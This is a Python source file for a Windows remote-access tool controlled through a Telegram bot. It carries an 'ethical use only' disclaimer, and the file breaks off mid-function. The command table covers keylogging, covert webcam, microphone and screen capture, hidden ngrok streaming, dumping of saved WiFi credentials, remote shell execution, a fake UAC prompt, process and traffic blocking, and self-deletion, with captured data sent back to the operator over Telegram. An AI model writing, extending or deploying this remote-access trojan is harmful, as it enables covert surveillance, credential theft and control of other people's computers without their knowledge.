"""
WARNINGS:
This code is meant only to run on Windows 10/11 (7 and 8 probably work as well), the original project was to make it cross platform but then I realized it was too much work, sorry Linux.
This code is NOT meant to be used without the owner's consent, it is meant for ethical use only, I am not responsable for any illegal use of this program.
If you lose control of your telegram bot, you could potentially lose the control of YOUR OWN MACHINE.

Also this bot can *NOT* be put in a group, it will not work.

~Riccardo Zappitelli
"""


__version__ = "2.65.0" # I kinda forget about this every 10 commits but its kinda funny at this point


#TELEGRAM
import html
import requests
from telepot import Bot, glance
from telepot.loop import MessageLoop
from telepot.exception import TelegramError
from urllib3.exceptions import MaxRetryError
from telepot.namedtuple import ReplyKeyboardMarkup

#IMAGES
import numpy as np
from PIL import Image
from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                 setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                 destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn,
                 destroyAllWindows, BORDER_CONSTANT, destroyWindow, copyMakeBorder)

#MERGE AUDIO&VIDEO
from moviepy.editor import AudioFileClip, VideoFileClip

#AUDIO
import soundfile as sf
import sounddevice as sd

#MISC
import os
import sys
import json
import ctypes
import psutil
import pyngrok
import inspect
import functools
import traceback
from io import BytesIO
import pyautogui as pg
import subprocess as sp
from shutil import copy2
from datetime import datetime
from tempfile import gettempdir
from typing import Any, Callable
from time import monotonic, sleep
from random import choice, randint
from cryptography.fernet import Fernet
from webbrowser import open as browseropen
from string import ascii_letters, printable
from subprocess import CREATE_NO_WINDOW, PIPE, Popen
from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, rename
from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN, KEY_UP
from os.path import join, abspath, isdir, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize

# This is needed to understand if the file was compiled or not
FROZEN = getattr(sys, 'frozen', False)
def resource_path(relative_path: str) -> str:
    if FROZEN:
        base_path = dirname(sys.executable)
    else:
        base_path = dirname(__file__)
    return join(base_path, relative_path)

def load_dll(path: str) -> None:
    print(f"Loading DLL:", path)
    path = resource_path(path)
    try:
        ctypes.WinDLL(path)
    except Exception as e:
        print(f"Error while loading the dll: {path}\n{e}")

# SETUP CONSTANTS
logging = True
iswindows = name == "nt"
islinux = not iswindows
cwd_folder = getcwd()
HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
BURN_DIRECTORY = gettempdir()
TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
TELEGRAM_COMMANDS_LIMIT = 100
TELEGRAM_COMMAND_LENGHT_LIMIT = 32
TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
KEY_PATH = resource_path("key.key")
GENERATE_COMMANDS_MD = False

try:
    vfx = resource_path(join("assets", "vfx"))
    sfx = resource_path(join("assets", "sfx"))
    executables = resource_path(join("assets", "executables"))
    fake_uac_prompt_path = join(executables, "fakeuac.exe")
    keyfile = resource_path("key.key")
    prototxt_filename = resource_path(join("assets","model","1.prototxt"))
    caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
    DLLS_DIR = resource_path(join("assets", "dlls"))
except Exception as e:
    print(e)
    exit()

# algoritm to get the key from the obfuscated key file
def get_real_key(key_path):
    if not os.path.isfile(key_path):
        raise RuntimeError(f"key.key not found: {key_path}")

    with open(key_path, "rb") as f:
        data = f.read()

    if len(data) < 10:
        raise RuntimeError("key.key too small")

    header = data[0:10]
    if header[0:5] != b"RCPTE":
        raise RuntimeError("Wrong magic bytes")

    jump = int.from_bytes(header[5:6], "big")
    first_pos = int.from_bytes(header[6:10], "big")

    if jump < 1 or jump > 15:
        raise RuntimeError(f"Invalid jump value: {jump}")

    # Reconstruct exactly 44 bytes
    key_bytes = bytearray()
    pos = first_pos

    for _ in range(44):
        if pos >= len(data):
            raise RuntimeError("Reached end of file while extracting key")
        key_bytes.append(data[pos])
        pos += 1 + jump

    if len(key_bytes) != 44:
        raise ValueError(f"Key reconstruction failed - got {len(key_bytes)} bytes instead of 44")
    return bytes(key_bytes)

DATA_ENCRYPTION = exists(keyfile)
if DATA_ENCRYPTION:
    FERNET_KEY = get_real_key(KEY_PATH)
    print(f"KEY: {FERNET_KEY}")
    if not FERNET_KEY:
        print("FERNET KEY IS NONE")
        sys.exit(1)
    FERNET = Fernet(FERNET_KEY)

if isdir(DLLS_DIR):
    print(f"DLLS Directory exists: {DLLS_DIR}")
    for file in listdir(DLLS_DIR):
        if isfile(file) and file.endswith(".dll"):
            load_dll(join(DLLS_DIR, file))
else:
    print(f"DLLS directory not does not exist or it was empty: {DLLS_DIR}")

# UTILS
# We import utils here so DLLS needed for modules are pre-loaded
from utils import *
try:
    from plugins import *
except ImportError as e:
    print(f"Plugins not loaded\n{e}\n")
    plugins = None

# This is needed so pyngrok is windowless and doesn't spawn a terminal window
def _patched_popen(*args, **kwargs):
    cmd_list = []
    if args:
        cmd_list = list(args)
    elif 'args' in kwargs:
        cmd_list = kwargs['args'] if isinstance(kwargs['args'], list) else [kwargs['args']]
    if any("ngrok" in str(part).lower() for part in cmd_list):
        kwargs["creationflags"] = kwargs.get("creationflags", 0) | CREATE_NO_WINDOW
    kwargs.setdefault("stderr", PIPE)
    kwargs.setdefault("stdout", PIPE)
    return Popen(*args, **kwargs)

def get_decrypted_content(fernet: Fernet, src_path) -> str:
    with open(src_path, "rb") as f:
        encrypted = f.read()
    decrypted = fernet.decrypt(encrypted)
    return decrypted

def decrypt_file(fernet, src_path, dst_path):
    decrypted = get_decrypted_content(fernet, src_path)
    with open(dst_path, "wb") as f:
        f.write(decrypted)

def decrypt_directory(fernet, src_dir, filter: Callable[[str], bool]|None=None):
    for root, dirs, files in os.walk(src_dir):
        for file in files:
            if filter:
                if not filter(file):
                    continue
            enc_path = os.path.join(root, file)
            plain_path = os.path.join(root, file[:-4])
            try:
                decrypt_file(fernet, enc_path, plain_path)
                os.remove(enc_path)
            except Exception:
                pass  # or log/raise depending on your needs

def close_all_tunnels(ngrok):
    tunnels = ngrok.get_tunnels()
    for tunnel in tunnels:
        try:
            ngrok.disconnect(tunnel.public_url)
        except Exception as e:
            print(f"Failed to disconnect {tunnel.public_url}: {e}")

def randomname(lenght: int=10) -> str:
    return "".join([ choice(ascii_letters) for _ in range(lenght)])

while isfile(BURN_DIRECTORY):
    BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)

if isfile(prototxt_filename) and isfile(caffemodel_filename):
    with open(prototxt_filename, 'rb') as f:
        prototxt_data = f.read()
    with open(caffemodel_filename, 'rb') as f:
        caffemodel_data = f.read()
    prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
    caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
    FACERECOGNITION = True
    net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
else:
    FACERECOGNITION = False

def check_webcam():
    try:
        cap = VideoCapture(0)
        if cap.isOpened():
            ret, _ = cap.read()
            cap.release()
            return "Detected ✅" + (" (Face recog ready)" if FACERECOGNITION else "")
        return "Not detected ❌"
    except:
        return "Error checking camera"

def now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# GETTING TOKEN AND CHAT_ID
def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
    """
    returns token, chatid, ngrok_token, tunnel_provider
    """
    if DATA_ENCRYPTION:
        print(f"Decrypting auth.json")
        try:
            var = json.loads(get_decrypted_content(FERNET, filename))
        except Exception as e:
            print(f"Error decrypting auth json:\n{e}")
    else:
        with open(filename) as fi:
            var = json.load(fi)
    if FROZEN:
        remove(filename)
    return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
        
# Resizing assets so they all take the same time to load when doing jumpscares
# or at lest that's what I think it should do
def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
    img = Image.fromarray(image_array)
    img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
    buffer = BytesIO()
    img_resized.save(buffer, 'JPEG', quality=quality)
    buffer.seek(0)
    compressed_image = np.array(Image.open(buffer))
    return compressed_image

def show_image_fullscreen(image, timeout=1250) -> None:
    namedWindow("FullScreenImage", WND_PROP_FULLSCREEN)
    setWindowProperty("FullScreenImage", WND_PROP_TOPMOST, 1)
    setWindowProperty("FullScreenImage", WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN)
    imshow("FullScreenImage", image) 
    waitKey(timeout)
    destroyAllWindows()

def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
    if not FACERECOGNITION:
        return False, None
    rls=True
    if cap:
        rls=False
    else:
        cap = VideoCapture(0)
    ret, frame = cap.read()
    if not ret:
        return 0, None
    if rls:
        cap.release()
    blob = dnn.blobFromImage(frame, 1.0, (300, 300), (104.0, 177.0, 123.0), False, False)
    net.setInput(blob)
    detections = net.forward()
    return sum(1 for i in range(detections.shape[2]) if detections[0, 0, i, 2] > 0.5), frame

def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
    return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }

def load_audios(sfx_folder: str=sfx) -> list[str]:
    return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }

def randompngname(lenght: int=10) -> str:
    return randomname(lenght)+".png"

def get_current_wallpaper():
    SPI_GETDESKWALLPAPER = 0x0073
    MAX_PATH = 260
    buffer = ctypes.create_unicode_buffer(MAX_PATH)
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer, 0)
    path = buffer.value
    return path if isfile(path) else None

def get_function_parameters(func):
    sig = inspect.signature(func)
    params = []
    for name, param in sig.parameters.items():
        if param.kind == inspect.Parameter.VAR_POSITIONAL:
            params.append(f'*{name}')
        elif param.kind == inspect.Parameter.VAR_KEYWORD:
            params.append(f'**{name}')
        else:
            params.append(name)
    return params

def get_required_params(func):
    sig = inspect.signature(func)
    return [
        name for name, param in sig.parameters.items()
        if param.default == inspect.Parameter.empty
        and param.kind in (
            inspect.Parameter.POSITIONAL_ONLY,
            inspect.Parameter.POSITIONAL_OR_KEYWORD,
            inspect.Parameter.KEYWORD_ONLY
        )
    ]

def backup_wallpaper(backup_path):
    """
    returns True if the operation was successful else False
    """
    current_wallpaper = get_current_wallpaper()
    if exists(current_wallpaper):
        copy2(current_wallpaper, backup_path)
        return True
    else:
        return False

def change_wallpaper(image_path) -> bool:
    """
    returns True if the wallpaper was changed else False
    """
    SPI_SETDESKWALLPAPER = 20  
    SPIF_UPDATEINIFILE = 0x01  
    SPIF_SENDWININICHANGE = 0x02  

    try:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abspath(image_path),
                                                   SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
        return True
    except Exception as e:
        return False

def pad_to_16_9(image):
    # Forces an image to be 16:9 using black padding
    height, width = image.shape[:2]
    current_ratio = width / height
    target_ratio = 16 / 9
    if abs(current_ratio - target_ratio) < 0.01:
        return image
    if current_ratio > target_ratio:
        new_height = int(width / target_ratio)
        pad = (new_height - height) // 2
        padded = copyMakeBorder(image, pad, new_height - height - pad, 0, 0, BORDER_CONSTANT, value=(0, 0, 0))
    else:
        new_width = int(height * target_ratio)
        pad = (new_width - width) // 2
        padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
    return padded



def terminate_process_by_name(process_name: str) -> None:
    for proc in psutil.process_iter():
        if proc.name().lower() == process_name.lower().strip():
                proc.terminate()

def requires_admin(func):
    @functools.wraps(func)
    def wrapper(self, *args, **kwargs):
        if self.has_admin:
            return func(self, *args, **kwargs)
        self.bsend("This function requires the program to be started as administrator")
    return wrapper


"""
ooooooooo.     .oooooo.   ooooooooo.
`888   `Y88.  d8P'  `Y8b  `888   `Y88.
 888   .d88' 888           888   .d88'  .ooooo.  oo.ooooo.
 888ooo88P'  888           888ooo88P'  d88' `88b  888' `88b
 888`88b.    888           888         888ooo888  888   888
 888  `88b.  `88b    ooo   888         888    .o  888   888
o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  888
                                                 o888o
"""
class PeppinoTelegram:
    def __init__(self, token: str, owner_id: int, ngrok_token: str, capture: VideoCapture, logger: DebugLogger,  loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
        self.token = token
        self.owner_id = owner_id
        self.ngrok_token = ngrok_token
        self.can_use_ngrok = bool(ngrok_token)
        self.tunnelhandler = TunnelManager(tunnel_provider)
        self.tunnel_provider = tunnel_provider
        self.has_admin = is_admin()
        self.logger = logger
        self.logger.bind(conflict_error, self.handle_conflict)
        self.jumpscare_volume = 100

        # Need to add this one so someone who spams my bot won't spam me
        self.strangers : list[int] = []

        if signal_error:
            self.bsend(signal_error)

        self.loading_bar_set = loading_bar_set
        self.loading_bar_spinner = loading_bar_spinner

        # this is used to send input prompts to the user without stopping the code
        self.user = {
            "status":None,             #can be "input_requested" or None 
            "last_response":None       #can be None, or the last response of an input
        }

        self.MOUSE_JMP = 50

        self.webcam_url = None
        self.screen_url = None
        self.webcam_and_screen_url = None

        self.process_killer_page = 0
        self.owner_name = ""
        self.connected = check_connection()

        self.cap = capture
        self.bot = Bot(token) 
        self.cantopenlist = []
        self.processmonitorlist = {} 
        self.duckyhelp = DUCKYHELP
        self.explorer_path = getcwd() # For now I'm not looing forward to make a file explorer
        self.running = True
        self.message_timeout = 5
        self.has_admin = is_admin()

        self.process_explorer_menu = None
        self.mixer_menu_keyboard = None
        self.mouse_controller_menu = None
        self.processmonitormenu = None
        self.display_mode_keyboard  = None
        self.cantopenmenu_ref = None
        self.mainmenu_ref = None

        self.overlay_tk = OverlayManager(self, BURN_DIRECTORY)
        self.overlay_opencv = OpenCVOverlayPlayer()
        self.audio_mixer = CustomMixer()
        self.audio_player = AudioPlayer()

        self.wifidumper = WifiDumper()
        self.all_session_messages: list[int] = []

        self.bars: dict[int:LoadingBar] = {}

        self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
        self.cmd_session_active: bool = False

        LOADING_STATUS_MESSAGE = self.new_editable_message("🛠️ Loading functions")

        #gets the function from the text
        self.commands = [

            # 🏠 Main Menu & Navigation (no buttons here, just category)
            Command("menu", self.mainmenu, "Open the main menu.", "menu", "🏠 Main Menu"),
            Command("mainmenu", self.mainmenu, "Open the main menu.", "menu", "🏠 Main Menu"),
            Command("menu_system", self.menu_system, "Open System & Shutdown menu.", "menu", "🛑 System & Shutdown"),
            Command("menu_network", self.menu_network, "Open Network & Remote Access menu.", "menu", "🌐 Network & Remote Access"),
            Command("menu_camera", self.menu_camera, "Open Camera & Screen menu.", "menu", "📸 Camera & Screen"),
            Command("menu_audio", self.menu_audio, "Open Audio & Volume menu.", "menu", "🔊 Audio & Volume"),
            Command("menu_soundfx", self.menu_soundfx, "Open Sound Effects menu.", "menu", "🎵 Sound Effects"),
            Command("menu_pranks", self.menu_pranks, "Open Pranks & Visuals menu.", "menu", "😈 Pranks & Visuals"),
            Command("menu_control", self.menu_control, "Open System Control menu.", "menu", "💻 System Control"),
            Command("menu_input", self.menu_input, "Open Input / Device Control menu.", "menu", "🎮 Input / Device Control"),
            Command("menu_messaging", self.menu_messaging, "Open Messaging menu.", "menu", "📋 Messaging"),
            Command("menu_cantopen", self.menu_cantopen, "Open Can't Open List menu.", "menu", "🔒 Can't Open List"),
            Command("menu_keylogger", self.menu_keylogger, "Open Keylogger menu.", "menu", "🧠 Keylogger"),
            Command("menu_misc", self.menu_misc, "Open Misc menu.", "menu", "🦑 Misc"),
            Command("menu_mitm", self.menu_mitm, "Open MITM menu.", "menu", "🕵️‍♂️ MITM"),
            Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "menu", "🔌 Your Plugins"),
            Command("menu_utilities", self.menu_utilities, "Open Utilitiemenu", "menu", "🔧 Utility"),
            Command("menu_user_interaction", self.menu_user_interaction, "Open Menu User Interaction", "menu", "👤 User Interaction"),
            Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "menu", "🦆 DuckyScript"),
            
            # 🛑 System & Shutdown
            Command("shutdown", self.shutdown, "Power off PC.", "system", "🛑 Shutdown"),
            Command("fakeshutdown", self.fake_shutdown, "Fake shutdown sequence.", "system", "🎭 Fakeshutdown"),
            Command("fakeuac", self.fakeuac, "Show fake UAC prompt.", "system", "🛡️ Fake UAC"),
            Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "system", "💣 Selfdestruction"),
            Command("clear", self.clear, "Clean windows, webcam, temp files.", "system", "🧹 Clear"),
            Command("altf4", self.altf4, "Send Alt+F4.", "system", "⌨️ Altf4"),

            # 🌐 Network & Remote Access
            Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "network", "📶 Wifiinfo"),
            Command("getip", self.getip, "Get public IP and location.", "network", "🌐 Get IP"),

            # 📸 Camera & Screen
            Command("selfie", self.selfie, "Take webcam photo.", "camera", "🤳 Webcam Snapshot"),
            Command("screenshot", self.screenshot, "Capture screen.", "camera", "🖼️ Take Screenshot"),
            Command("selfieandscreenshot", self.screenshotandselfie, "Caputre screen and webcam in the same image", "camera", "🤳🖼️ Take Screenshot&Webcam"),
            Command("fullclip", self.record_webcam_and_screen, "Record webcam and screen.", "camera", "🎞️ Record Full Clip"),
            Command("webcamclip", self.record_webcam, "Record webcam only.", "camera", "🎥 Record Webcam"),
            Command("screenclip", self.record_screen, "Record screen only.", "camera", "🖥️ Record Screen"),
            Command("recordjum", self.record_jumpscare_reaction, "Record jumpscare reaction.", "camera", "🎙️ Record Audio Jump"),
            Command("waitforface", self.waitforface, "Capture photo when face detected.", "camera", "⏳ Waiting for Face"),
            Command("checkforface", self.checkforface, "Check for face presence.", "camera", "🔍 Check for Face"),
            Command("displaymode", self.display_mode, "Change display mode.", "camera", "🖼️ Display Options"),
            Command("webcamstreamstart", self.start_webcam_tunnel, "Start webcam stream.", "camera", "📹🟢 Start Webcam Stream"),
            Command("screenstreamstart", self.start_screen_tunnel, "Start screen stream.", "camera", "🖥️🟢 Start Screen Stream"),
            Command("webcamstreamstop", self.stop_webcam_tunnel, "Stop webcam stream.", "camera", "📹🔴 Stop Webcam Stream"),
            Command("screenstreamstop", self.stop_screen_tunnel, "Stop screen stream.", "camera", "🖥️🔴 Stop Screen Stream"),
            Command("webcamandscreenstreamstart", self.start_webcam_and_screen_tunnel, "Start webcam and screen streams.", "camera", "📹🖥️🟢 Start Both Streams"),
            Command("webcamandscreenstreamstop", self.stop_webcam_and_screen_tunnel, "Stop webcam and screen streams.", "camera", "📹🖥️🔴 Stop Both Streams"),
            Command("stop_all_tunnels", self.stop_all_tunnels, "Stop all active streams.", "camera", "❌🔴 Stop All Streams"),
            Command("camerawallpaper", self.setCameraAsWallpaper, "Set webcam as wallpaper.", "camera", "📷 Camera Wallpaper"),
            Command("setvideowallpaper", self.setvideowallpaper, "Set video as wallpaper.", "camera", "🎞️ Set Video Wallpaper"),

            # 🔊 Audio & Volume
            Command("microphone", self.send_record_audio, "Record microphone audio.", "audio", "🎙️ Microphone"),
            Command("mutevolume", lambda: self.audio_mixer.mute(), "Mute system volume.", "audio", "🔇 Mute Volume"),
            Command("fullvolume", lambda: self.audio_mixer.full(), "Set volume to maximum.", "audio", "🔊 Full Volume"),
            Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "audio", "🎚️ Set Volume"),
            Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "audio", "📊 Get Volume"),
            Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "audio", "🎛️ Mixer Menu"),
            Command("playfromurl", self.audio_player.play_from_url, "Play audio from URL.", "audio", "🔗 Play from URL"),
            Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "audio", "📡 Play Noise"),
            Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay with audio.", "audio", "🌀📻 Video&Sound Disturbance"),

            # 🎵 Sound Effects
            Command("pss", self.pss, "Play 'psst' sound.", "sound_fx", "👂 Psst"),
            Command("psst", self.pss, "Alias for pss.", "sound_fx", "👂 Psst"),
            Command("breath", self.breath, "Play breathing sound.", "sound_fx", "🌬️ Breath"),
            Command("fart", self.fart, "Play fart sound.", "sound_fx", "💨 Fart"),
            Command("knockknock", self.knockknock, "Play knocking sound.", "sound_fx", "🚪 Knock"),
            Command("tralalerotralala", lambda: self.__play_loaded_sound("tralarero-tralala", volume=8), "Play Italian brainrot sound.", "sound_fx", "🎶 Tralalero"),
            Command("scream11s", self.scream_11s, "Play 11-second scream.", "sound_fx", "😱 11s Scream"),
            Command("scream15s", self.scream_15s, "Play 15-second scream.", "sound_fx", "😱 15s Scream"),
            Command("behindyou_kid", self.behindyou_kid, "Play 'Behind you' child voice.", "sound_fx", "👶 Behind you (kid)"),
            Command("behindyou_whisper", self.behindyou_whisper, "Play 'Behind you' whisper.", "sound_fx", "👻 Behind you (whisper)"),

            # 😈 Pranks & Visuals
            #TODO here are basically to add LoadingBarTimedWorker in the Commands who have TODO near to them
            Command("hidecursor", self.wrapper_for_hide_cursor, "Hides mouse's cursor", "pranks", "🖱️ Hide Mouse Cursor"),
            Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "pranks", "👻 Jumpscare"),
            Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "pranks", "😶‍🌫️ Jumpscare noaudio"),
            Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "pranks", "💀 Fake BSOD"),
            Command("invertedscreen", self.inverted_screen, "Invert screen colors.", "pranks", "🔄 Inverted Screen"),
            Command("showqr",self.show_qr_overlay,"Display QR code overlay with custom text. Args: url [text] [duration]","pranks","🟨 QR Overlay"),
            Command("distortedscreen", self.distorted_screen, "Distort screen output.", "pranks", "🌀 Distorted Screen"),
            Command("messagebox", self.message_box, "Show custom message box.", "pranks", "💬 Message Box"),
            Command("messagespam", self.spam_windows, "Spam message boxes.", "pranks", "📨 Message Spam"),
            Command("camerawallpaper", self.setCameraAsWallpaper, "Webcam as wallpaper.", "pranks", "📷 Camera Wallpaper"),
            Command("setvideowallpaper", self.setvideowallpaper, "Video as wallpaper.", "pranks", "🎞️ Set Video Wallpaper"),
            Command("hdmi_drowning_effect", self.wrapper_for_disturbed_overlay, "Noise overlay effect.", "pranks", "🖥️🌀 Video Signal Drowning Effect"),
            Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "pranks", "🌀📻 Video&Sound Disturbance"),#TODO
            Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "pranks", "👻 Red Text Overlay"),
            Command("set_jumpscare_volume", self.setJumpscareVolume, "Adjust jumpscare volume.","pranks" , "🔊 Jumpscare Volume"),
            Command("block_screen", self.wrapper_block_screen, "Block user screen temporarily forcing them to see a screenshot.", "pranks", "🖥️ Block Screen"), #TODO

            # 🦑 Misc & Memes
            Command("plankton", self.plankton, "Plankton jumpscare.", "misc", "🦑 Plankton"),
            Command("planktonnoaudio", self.planktonnoaudio, "Plankton without audio.", "misc", "🔇 Plankton no audio"),
            Command("johnpork", self.johnpork, "John Pork jumpscare.", "misc", "🐷 Johnpork"),
            Command("johnporknoaudio", self.johnporknoaudio, "John Pork without audio.", "misc", "🔕 Johnpork no audio"),
            Command("gabinetti", self.gabinetti, "Play Gabinetti meme.", "misc", "🛋️ Gabinetti"),
            Command("duckyscript", lambda *args: toducky(" ".join(args), execute=True), "Execute DuckyScript.", "misc", "⌨️ Duckyscript"),
            Command("duckyhelp", lambda: self.bsend(self.duckyhelp), "Show DuckyScript help.", "misc", "❓ Duckyhelp"),
            Command("browser", browseropen, "Open URL in browser.", "misc", "🌐 Browser"),

            # 💻 System Control
            Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "system_control", "💿 List Drives"),
            Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "system_control", "⚙️ Execute"),
            Command("execute", self.execute, "null", "null", "null"),
            Command("processkiller", self.process_killer, "Kill process from list.", "system_control", "💀 Process Killer"),
            Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "system_control", "🛑 Terminate Process"),
            Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "system_control", "➕ Procmon Add"),
            Command("procmonrem", self.processmonitorrem, "Remove process from monitor.", "system_control", "➖ Procmon Remove"),
            Command("procmonmenu", self.processmonitormenushow, "Show process monitor menu.", "system_control", "📊 Procmon Menu"),
            Command("cmdsession", self.cmdsession, "Open interactive CMD session.", "system_control", "</> CMDSession"),

            # 🎮 Input / Device Control
            Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "input", "🎹 Randomkeyboard"),
            Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "input", "🔠 Capslock"),
            Command("mouselock", self.mouselock, "Lock mouse position.", "input", "🖱️ Mouselock"),
            Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "input", "🎮 Mousecontroller"),
            Command("set_mouse_jump", self.setMouseJump, "Set mouse jump distance.", "input", "🎯 Set Mouse Jump"),
            Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️ Left Click"),
            Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️ Right Click"),

            # 📋 Messaging
            Command("bsend", self.bsend, "Send text message.", "messaging", "📤 Bsend"),
            Command("id", lambda: self.bsend(f"CHAT_ID: {self.owner_id}"), "Send chat ID.", "messaging", "🆔 Id"),
            Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "messaging", "❌ Deletemessages"),
            Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "messaging", "🗑️ Deleteallmessages"),

            # 👤 User Interaction
            Command("ask", self.user_prompt, "Ask Something to the user using the machine", "user_interaction", "🗣️ Ask"),
            Command("messagebox", self.message_box, "Show custom message box.", "user_interaction", "💬 Message Box"),
            Command("chat", self.chat, "Open chat interface.", "user_interaction", "💬 Chat"),
            Command("urltoast", notify_toast_with_url, "Show Windows toast with URL.", "user_interaction", "🔗 URL Toast"),
            Command("toast", notify_toast, "Show Windows toast.", "user_interaction", "🔔 Notification Toast"),
            Command("get_audio_toasts", self.get_audio_win_toasts, "Lists all the available audios for Windows Toasts.", "user_interaction", "🔊 Toast Sounds"),

            # 🔒 Can't Open List
            Command("cantopenadd", self.cantopen, "Block process execution.", "cant_open", "🚫 Cantopenadd"),
            Command("cantopenremove", self.removefromcantopen, "Unblock process execution.", "cant_open", "❌ Cantopenremove"),
            Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "cant_open", "📋 Cantopenmenu"),

            # 🧠 Keylogger
            Command("keylogger", self.keylogger, "Log keystrokes to file.", "keylogger", "⌨️ Keylogger"),
            Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "keylogger", "📡 Livekeylogger"),

            # 🕵️‍♂️ MITM
            Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "mitm", "🚫 Block Port"),
            Command("block_http", self.block_http, "Block all outbound HTTP traffic (port 80).", "mitm", "🚫 Block HTTP"),
            Command("block_https", self.block_https, "Block all outbound HTTPS traffic (port 443).", "mitm", "🚫 Block HTTPS"),
            Command("block_chrome", self.block_chrome, "Blocks traffic on chrome.", "mitm", "🚫 Block CHROME"),

            # 🔧 Utilities & Testing
            Command("status", lambda: self.bsend("Hey! I'm online"), "Just checking if the bot is online.",  "utility", "Check Status"),
            Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
            Command("stop", self.stop, "Stop current operation.", "utility", "🛑 Stop"),
            Command("test", self.test, "Run test routine.", "utility", "🧪 Test"),
            Command("help", self.show_help, "Show help menu.", "utility", "❓ Help"),
            Command("nothing", lambda: ..., "No-op command.", "utility", "Nothing"),
        ]

        self.help = generate_help(self.commands)
        self.function_table = {x.name:x.function for x in self.commands}
        LOADING_STATUS_MESSAGE.edit("✅ COMMANDS LOADED, 🔌 LOADING PLUGINS")

        if plugins:
            sleep(.25)
            plugins_commands = self.load_plugins(self.bot, plugins)
            if plugins_commands:
                function_table_update = {v[0]:v[1] for _,v in plugins_commands.items()}
                self.plugins_buttons = {k:f"/{v[0]}" for k,v in plugins_commands.items()}
                self.function_table.update(function_table_update)
            LOADING_STATUS_MESSAGE.edit("🔌 PLUGINS LOADED ✅")

        sleep(.25)
        self.no_background_functions = [self.message_box, self.spam_windows]
        LOADING_STATUS_MESSAGE.edit("🚀 READY")
        LOADING_STATUS_MESSAGE.delete()

    def __play_loaded_sound(self, audio: str, volume=None) -> None:
        print(f"Playing loaded sound: {audio}, volume={volume}")
        old = self.audio_mixer.getVolumePercentage()
        if volume:
            self.set_volume(volume)
        self.audio_player.play_wav(self.audios[audio])
        if volume:
            self.set_volume(old)


    def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None) -> int:
        print(f"Sending image: {image_name}, caption={caption}")
        """
        return a message id
        """
        try:
            assert (image_name is None) ^ (image_buf is None), "You can only use either image_name or image_buf"
            if image_buf:
                msg = self.bot.sendPhoto(self.owner_id, image_buf, caption=caption)["message_id"]
            if image_name:
                with open(image_name, "rb") as image:
                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
            return msg
        except Exception as e:
